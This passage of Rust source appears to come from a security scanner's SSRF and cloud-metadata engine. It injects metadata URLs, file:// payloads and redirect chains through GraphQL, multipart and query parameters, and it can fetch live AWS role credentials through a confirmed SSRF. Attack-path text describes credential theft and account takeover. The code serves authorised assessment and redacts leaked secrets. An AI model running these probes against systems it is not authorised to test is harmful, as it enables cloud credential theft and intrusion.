        .find(|m| m.provider == "aws" && m.url.contains("security-credentials"))
        .or_else(|| metadata_corpus().first());
    let Some(mt) = meta else {
        return (out, 0);
    };

    let mut jobs: Vec<(String, String, String, &'static str)> = Vec::new();
    for ep in endpoints
        .iter()
        .take(if settings.depth >= 4 { 8 } else { 4 })
    {
        for (doc, resolver) in GRAPHQL_SSRF_DOCS {
            jobs.push((ep.clone(), doc.to_string(), resolver.to_string(), mt.url));
        }
    }
    jobs.truncate(settings.max_requests / 8 + 6);
    let requests = jobs.len();

    let owned: Vec<(usize, String, String, String, String)> = jobs
        .iter()
        .enumerate()
        .map(|(i, j)| (i, j.0.clone(), j.1.clone(), j.2.clone(), j.3.to_string()))
        .collect();
    let results: Vec<Option<(usize, HttpProbe)>> = stream::iter(owned)
        .map(|(i, url, doc, _resolver, meta_url)| {
            let client = client.clone();
            async move {
                let vars = json!({ "url": meta_url, "u": meta_url });
                http_post_graphql_ssrf(&client, &url, &doc, &vars)
                    .await
                    .map(|p| (i, p))
            }
        })
        .buffer_unordered(settings.concurrency)
        .collect()
        .await;

    for (i, p) in results.into_iter().flatten() {
        let job = &jobs[i];
        let (resolver, meta_url) = (&job.2, job.3);
        if let Some(hit) = canary_hit(&p.body, mt.canaries) {
            let title = format!(
                "SSRF via GraphQL resolver '{resolver}' → {} metadata",
                mt.provider.to_uppercase()
            );
            if !seen.insert(title.clone()) {
                continue;
            }
            posture.record("critical", &title);
            posture.metadata_confirmed = true;
            posture
                .providers
                .insert(provider_base(mt.provider).to_string());
            let leaked = redact_secrets(&p.body);
            let mut ev = Evidence::new()
                .with("graphql_endpoint", job.0.clone())
                .with("resolver", resolver.clone())
                .with("payload", meta_url)
                .with("provider", mt.provider)
                .with("canary_matched", hit)
                .with("http_status", i64::from(p.status))
                .check(
                    "graphql_url_variable",
                    true,
                    format!("variables.url = {meta_url}"),
                )
                .raw_excerpt(p.body.as_bytes());
            if !leaked.is_empty() {
                ev = ev.with("leaked_material", json!(leaked.clone()));
            }
            out.push(mk_finding(
                &title,
                "critical",
                &format!(
                    "GraphQL endpoint {} accepted a URL variable on resolver '{}' pointing at cloud metadata — response contains canary '{}'. {}Confirmed GraphQL SSRF with credential exposure.",
                    job.0,
                    resolver,
                    hit,
                    if leaked.is_empty() { String::new() } else { format!("Leaked (redacted): {}. ", leaked.join(", ")) }
                ),
                host,
                &job.0,
                0.96,
                mt.provider,
                "graphql_ssrf",
                ev,
            ));
        }
    }
    (out, requests)
}

// ─────────────────────────────────────────────────────────────────────────────
// Multipart form SSRF — webhook / PDF-render / import sinks with URL form fields.
// ─────────────────────────────────────────────────────────────────────────────

const MULTIPART_URL_FIELDS: &[&str] = &[
    "url", "uri", "link", "webhook", "callback", "source", "src", "target", "file", "document",
];

async fn phase_multipart_injection(
    client: &reqwest::Client,
    settings: &Settings,
    points: &[String],
    host: &str,
    posture: &mut Posture,
    seen: &mut BTreeSet<String>,
) -> (Vec<Value>, usize) {
    let mut out = Vec::new();
    let mut jobs: Vec<(
        String,
        &'static str,
        &'static str,
        &'static [&'static str],
        &'static str,
    )> = Vec::new();
    for point in points.iter().take(4) {
        for mt in metadata_corpus()
            .iter()
            .filter(|m| m.min_depth <= 2 && provider_allowed(settings, m.provider))
        {
            for &field in MULTIPART_URL_FIELDS {
                jobs.push((point.clone(), mt.url, mt.provider, mt.canaries, field));
            }
        }
    }
    jobs.truncate(settings.max_requests / 5 + 8);
    let requests = jobs.len();

    let owned: Vec<(usize, String, String, String)> = jobs
        .iter()
        .enumerate()
        .map(|(i, j)| (i, j.0.clone(), j.1.to_string(), j.4.to_string()))
        .collect();
    let results: Vec<Option<(usize, HttpProbe)>> = stream::iter(owned)
        .map(|(i, url, meta_url, field)| {
            let client = client.clone();
            async move {
                http_post_multipart_url(&client, &url, &field, &meta_url)
                    .await
                    .map(|p| (i, p))
            }
        })
        .buffer_unordered(settings.concurrency)
        .collect()
        .await;

    for (i, p) in results.into_iter().flatten() {
        let job = &jobs[i];
        let (meta_url, canaries, provider, field) = (job.1, job.3, job.2, job.4);
        if let Some(hit) = canary_hit(&p.body, canaries) {
            let title = format!(
                "SSRF via multipart field '{field}' → {} metadata",
                provider.to_uppercase()
            );
            if !seen.insert(title.clone()) {
                continue;
            }
            posture.record("critical", &title);
            posture.metadata_confirmed = true;
            posture
                .providers
                .insert(provider_base(provider).to_string());
            let leaked = redact_secrets(&p.body);
            let mut ev = Evidence::new()
                .with("form_field", field)
                .with("content_type", "multipart/form-data")
                .with("payload", meta_url)
                .with("provider", provider)
                .with("canary_matched", hit)
                .with("http_status", i64::from(p.status))
                .check(
                    "multipart_url_field",
                    true,
                    format!("field '{field}' = {meta_url}"),
                )
                .raw_excerpt(p.body.as_bytes());
            if !leaked.is_empty() {
                ev = ev.with("leaked_material", json!(leaked.clone()));
            }
            out.push(mk_finding(
                &title,
                "critical",
                &format!(
                    "POSTing multipart/form-data with field '{field}' set to {meta_url} caused the server to fetch cloud metadata (canary '{hit}'). {}Confirmed multipart body SSRF.",
                    if leaked.is_empty() { String::new() } else { format!("Leaked (redacted): {}. ", leaked.join(", ")) }
                ),
                host,
                &job.0,
                0.95,
                provider,
                "multipart_ssrf",
                ev,
            ));
        }
    }
    (out, requests)
}

// ─────────────────────────────────────────────────────────────────────────────
// Redirect → metadata chain — open-redirect parameter follows through to IMDS.
// ─────────────────────────────────────────────────────────────────────────────

async fn phase_redirect_metadata_chain(
    client: &reqwest::Client,
    settings: &Settings,
    points: &[String],
    host: &str,
    posture: &mut Posture,
    seen: &mut BTreeSet<String>,
) -> (Vec<Value>, usize) {
    let mut out = Vec::new();
    let meta_targets: Vec<&MetaTarget> = metadata_corpus()
        .iter()
        .filter(|m| {
            m.min_depth <= 2
                && provider_allowed(settings, m.provider)
                && !m.provider.contains("bypass")
        })
        .take(4)
        .collect();
    let mut jobs: Vec<(
        String,
        String,
        String,
        &'static [&'static str],
        &'static str,
    )> = Vec::new();
    for point in points.iter().take(3) {
        for rp in settings.redirect_params.iter().take(8) {
            for mt in &meta_targets {
                jobs.push((
                    point.clone(),
                    rp.clone(),
                    mt.url.to_string(),
                    mt.canaries,
                    mt.provider,
                ));
            }
        }
    }
    jobs.truncate(settings.max_requests / 6 + 6);
    let requests = jobs.len();

    let owned: Vec<(usize, String, String, String)> = jobs
        .iter()
        .enumerate()
        .map(|(i, j)| (i, j.0.clone(), j.1.clone(), j.2.clone()))
        .collect();
    let results: Vec<Option<(usize, HttpProbe)>> = stream::iter(owned)
        .map(|(i, point, rp, meta_url)| {
            let client = client.clone();
            async move {
                let url = add_query(&point, &rp, &meta_url);
                http_get(&client, &url).await.map(|p| (i, p))
            }
        })
        .buffer_unordered(settings.concurrency)
        .collect()
        .await;

    for (i, p) in results.into_iter().flatten() {
        let job = &jobs[i];
        let (rp, meta_url, canaries, provider) = (&job.1, &job.2, job.3, job.4);
        if let Some(hit) = canary_hit(&p.body, canaries) {
            let title = format!(
                "Redirect→Metadata chain via '{rp}' → {} exposure",
                provider.to_uppercase()
            );
            if !seen.insert(title.clone()) {
                continue;
            }
            posture.record("critical", &title);
            posture.metadata_confirmed = true;
            posture.redirect_metadata_chain = true;
            posture
                .providers
                .insert(provider_base(provider).to_string());
            let leaked = redact_secrets(&p.body);
            let mut ev = Evidence::new()
                .with("redirect_parameter", rp.clone())
                .with("metadata_url", meta_url.clone())
                .with("provider", provider)
                .with("canary_matched", hit)
                .with("http_status", i64::from(p.status))
                .check("redirect_to_metadata", true, format!("{rp}={meta_url}"))
                .raw_excerpt(p.body.as_bytes());
            if !leaked.is_empty() {
                ev = ev.with("leaked_material", json!(leaked.clone()));
            }
            out.push(mk_finding(
                &title,
                "critical",
                &format!(
                    "Redirect parameter '{}' accepted a cloud metadata URL ({}) and the response contains canary '{}' — allow-list bypass via open redirect yields direct credential exposure in one hop.",
                    rp, meta_url, hit
                ),
                host,
                &add_query(&job.0, rp, meta_url),
                0.94,
                provider,
                "redirect_metadata_chain",
                ev,
            ));
        }
    }
    (out, requests)
}

// ─────────────────────────────────────────────────────────────────────────────
// Attack-path synthesis + posture summary.
// ─────────────────────────────────────────────────────────────────────────────

fn attack_paths(p: &Posture, target: &str) -> Vec<Value> {
    let mut paths = Vec::new();
    let mut mk = |title: &str, severity: &str, steps: Vec<&str>, why: &str| {
        let mut ev = Evidence::new()
            .with("steps", json!(steps))
            .with("rationale", why);
        for (i, s) in steps.iter().enumerate() {
            ev = ev.check(&format!("step_{}", i + 1), true, *s);
        }
        let mut f = finding_rich(
            ENGINE_ID,
            title,
            severity,
            "T1552.005",
            &format!(
                "Toxic combination → {why} Attack path: {}.",
                steps.join(" → ")
            ),
            target,
            0.9,
            ev,
        );
        if let Some(o) = f.as_object_mut() {
            o.insert("finding_kind".into(), json!("attack_path"));
            o.insert("path_steps".into(), json!(steps));
        }
        paths.push(f);
    };

    if p.metadata_confirmed {
        let providers = if p.providers.is_empty() {
            "the cloud".to_string()
        } else {
            p.providers.iter().cloned().collect::<Vec<_>>().join("/")
        };
        mk(
            "Attack Path: SSRF → Instance Metadata → Cloud Account Takeover",
            "critical",
            vec![
                "abuse the SSRF-vulnerable parameter",
                "reach the instance metadata service (IMDS)",
                "exfiltrate temporary cloud credentials",
                "assume the workload IAM role and pivot to account admin",
            ],
            &format!("SSRF reaches {providers} metadata and leaks live credentials — the canonical cloud breach chain."),
        );
    }
    if p.credential_extraction {
        mk(
            "Attack Path: SSRF → Live AWS Credential Theft → Immediate Cloud Compromise",
            "critical",
            vec![
                "exploit SSRF to list IAM role from IMDS",
                "fetch live AccessKeyId + SecretAccessKey + SessionToken",
                "authenticate to AWS APIs as the workload role",
                "pivot to S3, Secrets Manager, and lateral movement",
            ],
            "two-step credential extraction confirmed — attacker can authenticate to AWS right now.",
        );
    }
    if p.imdsv2_reachable && !p.credential_extraction {
        mk(
            "Attack Path: SSRF → IMDSv2 Metadata Plane (token required, still reachable)",
            "high",
            vec![
                "reach the IMDSv2 token endpoint via SSRF",
                "attempt token theft via SSRF header injection or race",
                "exfiltrate credentials if hop-limit misconfigured",
            ],
            "IMDSv2 is enforced but the metadata plane is still reachable from SSRF — hop-limit bypass or side-channel may still yield credentials.",
        );
    }
    if p.file_read {
        mk(
            "Attack Path: SSRF file:// → Local File / Secret Disclosure",
            "high",
            vec![
                "supply a file:// payload to the fetcher",
                "read local files (/etc/passwd, app config)",
                "harvest embedded secrets / keys",
            ],
            "the fetcher honours the file:// scheme, exposing the local filesystem.",
        );
    }
    if p.internal_service || p.arbitrary_fetch {
        mk(
            "Attack Path: SSRF → Internal Network Pivot",
            "high",
            vec![
                "point the SSRF parameter at internal hosts/ports",
                "enumerate internal-only services",
                "exploit unauthenticated internal admin/data services",
            ],
            "the server issues attacker-controlled requests to internal targets unreachable from outside.",
        );
    }
    if p.open_redirect {
        mk(
            "Attack Path: Open Redirect → SSRF Allow-list Bypass / Phishing",
            "medium",
            vec![
                "find the open-redirect endpoint",
                "chain it to bypass an SSRF/URL allow-list",
                "or weaponise it for credential phishing",
            ],
            "an open redirect both defeats naive SSRF allow-lists and enables phishing.",
        );
    }
    if p.redirect_metadata_chain {
        mk(
            "Attack Path: Open Redirect → Cloud Metadata → Account Takeover (one hop)",
            "critical",
            vec![
                "abuse the open-redirect parameter",
                "point it at the instance metadata service",
                "exfiltrate cloud credentials without touching the SSRF sink directly",
            ],
            "redirect parameter follows through to IMDS — allow-list bypass yields credential theft in a single request.",
        );
    }
    paths
}

fn posture_summary(p: &Posture, target: &str, requests: usize, settings: &Settings) -> Value {
    let score = if settings.posture_scoring {
        p.score.clamp(0.0, 1.0)
    } else {
        0.0
    };
    let grade = if !settings.posture_scoring || p.confirmed == 0 {
        "info"
    } else {
        severity_for_score(score)
    };
    let crit = p.by_sev.get("critical").copied().unwrap_or(0);
    let high = p.by_sev.get("high").copied().unwrap_or(0);
    let med = p.by_sev.get("medium").copied().unwrap_or(0);
    let low = p.by_sev.get("low").copied().unwrap_or(0);

    let summary_text = if p.confirmed == 0 {
        format!(
            "SSRF & cloud-metadata exploitation scan complete on {} — {} probes issued, no SSRF/metadata/redirect signal observed. Posture: clean for the tested surface.",
            target, requests
        )
    } else {
        format!(
            "SSRF exposure on {}: {} confirmed finding(s) ({} critical / {} high / {} medium / {} low) across {} probes. Exposure score {:.0}/100. {}{}",
            target, p.confirmed, crit, high, med, low, requests, score * 100.0,
            if p.metadata_confirmed { "CLOUD CREDENTIAL THEFT is achievable via instance metadata — rotate exposed role credentials and enforce IMDSv2. " } else { "" },
            if !p.crown_jewels.is_empty() { format!("Crown-jewel risks: {}.", p.crown_jewels.join("; ")) } else { String::new() }
        )
    };

    let ev = Evidence::new()
        .with("exposure_score", json!((score * 100.0).round() as i64))
        .with("confirmed_findings", i64::from(p.confirmed))
        .with("probes_issued", requests as i64)
        .with(
            "severity_breakdown",
            json!({"critical": crit, "high": high, "medium": med, "low": low}),
        )
        .with(
            "cloud_providers",
            json!(p.providers.iter().cloned().collect::<Vec<_>>()),
        )
        .with("scan_depth", i64::from(settings.depth))
        .with(
            "signals",
            json!({
                "metadata_credentials": p.metadata_confirmed,
                "file_read": p.file_read,
                "internal_service": p.internal_service,
                "open_redirect": p.open_redirect,
                "oob_planted": p.oob_planted,
            }),
        )
        .with("crown_jewels", json!(p.crown_jewels.clone()));

    let mut f = finding_rich(
        ENGINE_ID,
        "SSRF & Cloud-Metadata Posture Summary",
        grade,
        "T1552.005",
        &summary_text,
        target,
        1.0,
        ev,
    );
    if let Some(o) = f.as_object_mut() {
        o.insert("finding_kind".into(), json!("posture_summary"));
        o.insert(
            "exposure_score".into(),
            json!((score * 100.0).round() as i64),
        );
    }
    f
}

// ─────────────────────────────────────────────────────────────────────────────
// Entry point.
// ─────────────────────────────────────────────────────────────────────────────

/// Context-aware entry point (matches the `engine_dispatch` `_ctx` convention). All operator knobs
/// flow in via `ctx.job_params`.
pub async fn run_ssrf_advanced_result_ctx(target: &str, ctx: &EngineRunContext) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let settings = parse_settings(ctx);
    let base = normalize_url(target);
    let host = extract_host(&base);
    let client = build_client(settings.timeout_ms, &settings.auth_headers).await;

    // Baseline (no injection) for differential analysis.
    let baseline_probe = http_get(&client, &base).await;
    let baseline = Baseline {
        status: baseline_probe.as_ref().map(|p| p.status).unwrap_or(0),
        body_len: baseline_probe.as_ref().map(|p| p.body.len()).unwrap_or(0),
    };

    let points = injection_points(&base, &settings.extra_points);
    let work = build_work(&settings, &points);
    let total_probes = work.len();

    // Concurrent, bounded probing. Stream OWNED request data (index, url, headers) so the futures
    // never borrow `work` — this avoids the higher-ranked-lifetime bound `buffer_unordered` rejects.
    let request_jobs: Vec<(usize, String, Vec<(String, String)>)> = work
        .iter()
        .enumerate()
        .map(|(i, p)| (i, p.url.clone(), p.headers.clone()))
        .collect();
    let responses: Vec<(usize, Option<HttpProbe>)> = stream::iter(request_jobs)
        .map(|(i, url, headers)| {
            let client = client.clone();
            async move {
                let resp = if headers.is_empty() {
                    http_get(&client, &url).await
                } else {
                    let h: Vec<(&str, &str)> = headers
                        .iter()
                        .map(|(k, v)| (k.as_str(), v.as_str()))
                        .collect();
                    http_get_with_headers(&client, &url, &h).await
                };
                (i, resp)
            }
        })
        .buffer_unordered(settings.concurrency)
        .collect()
        .await;

    let mut posture = Posture::default();
    let mut findings: Vec<Value> = Vec::new();
    let mut capable_param: Option<String> = None;
    let mut seen_titles: BTreeSet<String> = BTreeSet::new();

    for (i, resp) in responses {
        let Some(p) = resp else { continue };
        let probe = &work[i];

        match probe.kind {
            TestKind::QueryMetadata | TestKind::HeaderMetadata | TestKind::Scheme => {
                // IMDSv2 token endpoint: 401/403 + InvalidMetadataToken = v2 enforced but metadata plane exposed.
                if probe.payload.contains("/latest/api/token")
                    && !p.body.contains("AccessKeyId")
                    && (p.body.contains("InvalidMetadataToken")
                        || p.body.contains("Unauthorized")
                        || matches!(p.status, 401 | 403))
                {
                    let title = "SSRF reaches AWS IMDSv2 token endpoint (metadata plane exposed)"
                        .to_string();
                    if seen_titles.insert(title.clone()) {
                        posture.record("high", &title);
                        posture.imdsv2_reachable = true;
                        posture.providers.insert("aws".to_string());
                        let ev = Evidence::new()
                            .with("injection_point", probe.point_label.clone())
                            .with("payload", probe.payload.clone())
                            .with("http_status", i64::from(p.status))
                            .check(
                                "imdsv2_token_endpoint_reachable",
                                true,
                                format!("HTTP {} with IMDSv2 enforcement signal", p.status),
                            )
                            .raw_excerpt(p.body.as_bytes());
                        findings.push(mk_finding(
                            &title,
                            "high",
                            &format!(
                                "SSRF at {} reached the AWS IMDSv2 token endpoint (HTTP {}). IMDSv2 is enforced (token required) but the metadata plane is still reachable — misconfigured hop-limit or header-injection races can still yield credentials.",
                                probe.point_label, p.status
                            ),
                            &host,
                            &probe.url,
                            0.92,
                            "aws",
                            "imdsv2_posture",
                            ev,
                        ));
                    }
                    continue;
                }

                // Strongest signal: canary content (definitive metadata/credential exposure).
                if let Some(hit) = canary_hit(&p.body, probe.canaries) {
                    if probe.kind == TestKind::Scheme {
                        if !passwd_signature(&p.body) {
                            continue;
                        }
                    }
                    let is_file = probe.provider == "scheme";
                    let title = if is_file {
                        format!("SSRF file:// Local File Read via {}", probe.point_label)
                    } else {
                        format!(
                            "SSRF → {} Metadata Credential Exposure via {}",
                            probe.provider.to_uppercase(),
                            probe.point_label
                        )
                    };
                    if !seen_titles.insert(title.clone()) {
                        continue;
                    }
                    posture.record("critical", &title);
                    if is_file {
                        posture.file_read = true;
                    } else {
                        posture.metadata_confirmed = true;
                        posture
                            .providers
                            .insert(provider_base(probe.provider).to_string());
                    }
                    if capable_param.is_none() {
                        capable_param = param_name(&probe.point_label);
                    }
                    let leaked = redact_secrets(&p.body);
                    let mut ev = Evidence::new()
                        .with("injection_point", probe.point_label.clone())
                        .with("payload", probe.payload.clone())
                        .with("provider", probe.provider)
                        .with("probe_class_severity", probe.base_severity)
                        .with("note", probe.note)
                        .with("canary_matched", hit)
                        .with("http_status", i64::from(p.status))
                        .check("canary_in_response", true, format!("matched '{hit}'"))
                        .raw_excerpt(p.body.as_bytes());
                    if !leaked.is_empty() {
                        ev = ev.with("leaked_material", json!(leaked.clone())).check(
                            "secret_material_leaked",
                            true,
                            leaked.join(", "),
                        );
                    }
                    findings.push(mk_finding(
                        &title,
                        "critical",
                        &format!(
                            "Injection at {} caused the server to fetch {} and return its content (canary '{}', HTTP {}). {}{} This is confirmed SSRF with direct sensitive-data exposure.",
                            probe.point_label,
                            probe.payload,
                            hit,
                            p.status,
                            probe.note,
                            if leaked.is_empty() { String::new() } else { format!(" Leaked (redacted): {}.", leaked.join(", ")) }
                        ),
                        &host,
                        &probe.url,
                        0.98,
                        probe.provider,
                        if is_file { "file_read" } else { "metadata_exposure" },
                        ev,
                    ));

                    // ── Multi-role AWS / ECS credential chain: enumerate every role/task (≤3) and
                    // fetch live temporary credentials through the same SSRF surface. ──
                    if probe.headers.is_empty()
                        && probe.provider.starts_with("aws")
                        && (probe.payload.ends_with("security-credentials/")
                            || probe.payload.contains("169.254.170.2/v2/credentials"))
                    {
                        let chain = extract_aws_credential_chain(
                            &client,
                            probe,
                            &p.body,
                            &host,
                            &mut posture,
                            &mut seen_titles,
                        )
                        .await;
                        findings.extend(chain);
                    }
                    continue;
                }

                // Secondary signal: calibrated differential that is not mere reflection.
                let delta = (p.body.len() as i64 - baseline.body_len as i64).unsigned_abs();
                let differential = p.status >= 200
                    && p.status < 400
                    && (p.status != baseline.status || delta > 256)
                    && !looks_like_reflection(&p.body, &probe.payload);
                if differential {
                    let title = format!(
                        "SSRF: differential server-side fetch via {} (unconfirmed)",
                        probe.point_label
                    );
                    if !seen_titles.insert(title.clone()) {
                        continue;
                    }
                    // Secondary/heuristic signal only: a status-or-size differential can also be
                    // produced by the mere PRESENCE of the injected parameter (validation error,
                    // personalized page, 302→login) without any server-side fetch. Report as
                    // medium posture; the OAST-canary path above remains the high/critical
                    // confirmation. Don't assert arbitrary_fetch on this unconfirmed signal.
                    posture.record("medium", &title);
                    if capable_param.is_none() {
                        capable_param = param_name(&probe.point_label);
                    }
                    let ev = Evidence::new()
                        .with("injection_point", probe.point_label.clone())
                        .with("payload", probe.payload.clone())
                        .with("http_status", i64::from(p.status))
                        .with("baseline_status", i64::from(baseline.status))
                        .with("body_delta_bytes", delta as i64)
                        .check(
                            "status_or_size_differential",
                            true,
                            format!(
                                "HTTP {} vs baseline {} (Δ{} B)",
                                p.status, baseline.status, delta
                            ),
                        )
                        .check(
                            "not_reflection",
                            true,
                            "payload not echoed in the response body",
                        );
                    findings.push(mk_finding(
                        &title,
                        "high",
                        &format!(
                            "Injecting {} at {} produced a response materially different from baseline (HTTP {} → {}, body Δ{} B) without reflecting the payload — the server is issuing attacker-controlled requests. Confirm scope via OAST.",
                            probe.payload, probe.point_label, baseline.status, p.status, delta
                        ),
                        &host,
                        &probe.url,
                        0.7,
                        probe.provider,
                        "differential_fetch",
                        ev,
                    ));
                }
            }
            TestKind::OpenRedirect => {
                if matches!(p.status, 301 | 302 | 303 | 307 | 308) {
                    if let Some(loc) = header_value(&p.headers, "location") {
                        if loc.contains(REDIRECT_MARKER_HOST) {
                            let title = format!("Open Redirect via {}", probe.point_label);
                            if !seen_titles.insert(title.clone()) {
                                continue;
                            }
                            posture.record("high", &title);
                            posture.open_redirect = true;
                            let ev = Evidence::new()
                                .with("injection_point", probe.point_label.clone())
                                .with("payload", probe.payload.clone())
                                .with("location_header", loc.to_string())
                                .with("http_status", i64::from(p.status))
                                .check("location_to_attacker_host", true, loc.to_string());
                            findings.push(mk_finding(
                                &title,
                                "high",
                                &format!(
                                    "{} returned HTTP {} with Location: {} — an attacker-controlled redirect. Enables phishing and SSRF allow-list bypass.",
                                    probe.point_label, p.status, loc
                                ),
                                &host,
                                &probe.url,
                                0.95,
                                "redirect",
                                "open_redirect",
                                ev,
                            ));
                        }
                    }
                }
            }
            TestKind::Oob => {
                // We cannot poll a third-party interaction server here, so we honestly report the
                // probe as planted (verify out-of-band). Only one summary row per scan.
                if !posture.oob_planted {
                    posture.oob_planted = true;
                    let title = "SSRF out-of-band probes planted".to_string();
                    posture.record("info", &title);
                    let ev = Evidence::new()
                        .with("payload", probe.payload.clone())
                        .with(
                            "interaction_domain",
                            settings.oast_domain.clone().unwrap_or_default(),
                        )
                        .check("oob_payload_planted", true, probe.payload.clone());
                    findings.push(mk_finding(
                        &title,
                        "info",
                        &format!(
                            "Out-of-band SSRF payloads ({}…) were injected across parameters/headers. Check your interaction server for DNS/HTTP callbacks to confirm blind SSRF.",
                            probe.payload
                        ),
                        &host,
                        &probe.url,
                        0.5,
                        "oob",
                        "oob_planted",
                        ev,
                    ));
                }
            }
        }
    }

    // Optional internal-reachability probing via a confirmed SSRF parameter.
    let mut extra_requests = 0usize;
    if settings.internal_port_scan {
        // `capable_param` already holds the extracted parameter name (e.g. "url").
        if let Some(param) = capable_param.clone() {
            let ip_findings = phase_internal_ports(
                &client,
                &settings,
                &points,
                &param,
                &baseline,
                &host,
                &mut posture,
            )
            .await;
            extra_requests += settings.internal_ports.len() + settings.internal_hosts.len();
            findings.extend(ip_findings);
        }
    }

    // POST/JSON body-based SSRF (webhook / URL-preview / PDF-render sinks).
    if settings.test_body {
        let (body_findings, n) = phase_body_injection(
            &client,
            &settings,
            &points,
            &host,
            &mut posture,
            &mut seen_titles,
        )
        .await;
        extra_requests += n;
        findings.extend(body_findings);
        if settings.depth >= 3 {
            let (xml_findings, n2) = phase_xml_body_injection(
                &client,
                &settings,
                &points,
                &host,
                &mut posture,
                &mut seen_titles,
            )
            .await;
            extra_requests += n2;
            findings.extend(xml_findings);
        }
    }

    if settings.test_multipart {
        let (mp_findings, n) = phase_multipart_injection(
            &client,
            &settings,
            &points,
            &host,
            &mut posture,
            &mut seen_titles,
        )
        .await;
        extra_requests += n;
        findings.extend(mp_findings);
    }

    if settings.test_graphql {
        let (gql_findings, n) = phase_graphql_injection(
            &client,
            &settings,
            &base,
            &host,
            &mut posture,
            &mut seen_titles,
        )
        .await;
        extra_requests += n;
        findings.extend(gql_findings);
    }

    if settings.redirect_metadata_chain && settings.open_redirect {
        let (rd_findings, n) = phase_redirect_metadata_chain(
            &client,
            &settings,
            &points,
            &host,
            &mut posture,
            &mut seen_titles,
        )
        .await;
        extra_requests += n;
        findings.extend(rd_findings);
    }

    // Time-based blind SSRF oracle (no OAST required) — only when nothing was already confirmed
    // in-band, to keep the scan lean and avoid redundant latency probing.
    if settings.timing_oracle && !posture.metadata_confirmed && !posture.arbitrary_fetch {
        let (timing_findings, n) =
            phase_timing_oracle(&settings, &points, &host, &mut posture).await;
        extra_requests += n;
        findings.extend(timing_findings);
    }

    // Synthesized attack paths (operator-toggleable), then the always-present posture summary.
    let mut out: Vec<Value> = findings
        .into_iter()
        .filter(|f| {
            sev_rank(f.get("severity").and_then(Value::as_str).unwrap_or("info"))
                >= settings.min_sev_rank
        })
        .collect();
    if settings.attack_synth {
        for ap in attack_paths(&posture, &host) {
            if sev_rank(ap.get("severity").and_then(Value::as_str).unwrap_or("info"))
                >= settings.min_sev_rank
            {
                out.push(ap);
            }
        }
    }
    out.push(posture_summary(
        &posture,
        &host,
        total_probes + extra_requests,
        &settings,
    ));

    let confirmed = posture.confirmed;
    EngineResult::ok(
        out,
        format!(
            "SSRF/Cloud-Metadata: {} finding(s) on {} ({} probes, depth {}{})",
            confirmed,
            host,
            total_probes + extra_requests,
            settings.depth,
            if posture.metadata_confirmed {
                ", METADATA CREDS EXPOSED"
            } else {
                ""
            }
        ),
    )
}

fn provider_base(p: &str) -> &str {
    p.split('-').next().unwrap_or(p)
}

/// Extract the param/header name from a point label like `param 'url'` or `header 'X-Forwarded-For'`.
fn param_name(label: &str) -> Option<String> {
    let start = label.find('\'')? + 1;
    let end = label[start..].find('\'')? + start;
    Some(label[start..end].to_string())
}

/// Backward-compatible no-context entry point (original 1-arg signature). Builds a default context
/// so legacy callers and the CLI keep working.
pub async fn run_ssrf_advanced_result(target: &str) -> EngineResult {
    run_ssrf_advanced_result_ctx(target, &EngineRunContext::default()).await
}

pub async fn run_ssrf_advanced(target: &str) {
    print_result(run_ssrf_advanced_result(target).await);
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(v: Value) -> EngineRunContext {
        EngineRunContext {
            job_params: v,
            ..Default::default()
        }
    }

    #[test]
    fn depth_and_severity_parsing() {
        assert_eq!(depth_from_str("light"), 1);
        assert_eq!(depth_from_str("normal"), 2);
        assert_eq!(depth_from_str("aggressive"), 3);
        assert_eq!(depth_from_str("exhaustive"), 4);
        assert_eq!(sev_rank("critical"), 4);
        assert_eq!(sev_rank("unknown"), 0);
    }

    #[test]
    fn metadata_corpus_is_well_formed() {
        let m = metadata_corpus();
        assert!(m.len() >= 15, "corpus should be comprehensive");
        let providers: BTreeSet<&str> = m.iter().map(|t| provider_base(t.provider)).collect();
        for want in [
            "aws",
            "gcp",
            "azure",
            "alibaba",
            "oracle",
            "digitalocean",
            "kubernetes",
        ] {
            assert!(providers.contains(want), "missing provider: {want}");
        }
        for t in m {
            assert!(
                !t.canaries.is_empty(),
                "every target needs canaries: {}",
                t.url
            );
            assert!(matches!(t.min_depth, 1..=4));
        }
    }

    #[test]
    fn add_query_handles_existing_query() {
        assert_eq!(
            add_query("https://x.test", "url", "http://a"),
            "https://x.test?url=http%3A%2F%2Fa"
        );
        assert!(add_query("https://x.test?a=1", "url", "b").starts_with("https://x.test?a=1&url="));
    }

    #[test]
    fn canary_and_reflection_detection() {
        assert_eq!(
            canary_hit("...AccessKeyId: AKIA...", &["AccessKeyId"]),
            Some("AccessKeyId")
        );
        assert!(canary_hit("nothing", &["AccessKeyId"]).is_none());
        assert!(looks_like_reflection(
            "you sent http://169.254.169.254/x",
            "http://169.254.169.254/x"
        ));
        assert!(!looks_like_reflection(
            "totally different page",
            "http://169.254.169.254/x"
        ));
    }

    #[test]
    fn passwd_signature_is_anchored() {
        assert!(passwd_signature("root:x:0:0:root:/root:/bin/bash"));
        assert!(!passwd_signature("the root cause of the issue"));
    }

    #[test]
    fn param_name_extraction() {
        assert_eq!(param_name("param 'url'").as_deref(), Some("url"));
        assert_eq!(
            param_name("header 'X-Forwarded-For'").as_deref(),
            Some("X-Forwarded-For")
        );
        assert_eq!(param_name("no quotes"), None);
    }

    #[test]
    fn settings_provider_filter_and_toggles() {
        let s = parse_settings(&cfg(json!({
            "intensity": "exhaustive",
            "metadata_providers": "aws,gcp",
            "test_schemes": false
        })));
        assert_eq!(s.depth, 4);
        assert!(!s.test_schemes);
        assert!(provider_allowed(&s, "aws"));
        assert!(provider_allowed(&s, "aws-bypass"));
        assert!(!provider_allowed(&s, "azure"));
    }

    #[test]
    fn build_work_respects_depth_and_budget() {
        let light = parse_settings(&cfg(
            json!({"intensity": "light", "open_redirect": false, "test_headers": false}),
        ));
        let pts = injection_points("https://x.test", &[]);
        let w = build_work(&light, &pts);
        assert!(!w.is_empty());
        assert!(w.iter().all(|p| p.kind == TestKind::QueryMetadata));

        let capped = parse_settings(&cfg(json!({"intensity": "exhaustive", "max_requests": 25})));
        let w2 = build_work(&capped, &pts);
        assert!(w2.len() <= 25, "must honour max_requests budget");
    }

    #[test]
    fn iam_role_parsing_is_sanitised() {
        assert_eq!(
            parse_iam_roles("WebServerRole\n"),
            vec!["WebServerRole".to_string()]
        );
        let multi = parse_iam_roles("RoleA\nRoleB\nRoleC\nRoleD");
        assert_eq!(multi.len(), 3); // bounded to 3
                                    // Rejects HTML / spaces (soft-404 pages must not be treated as role names).
        assert!(parse_iam_roles("<html>not found</html>").is_empty());
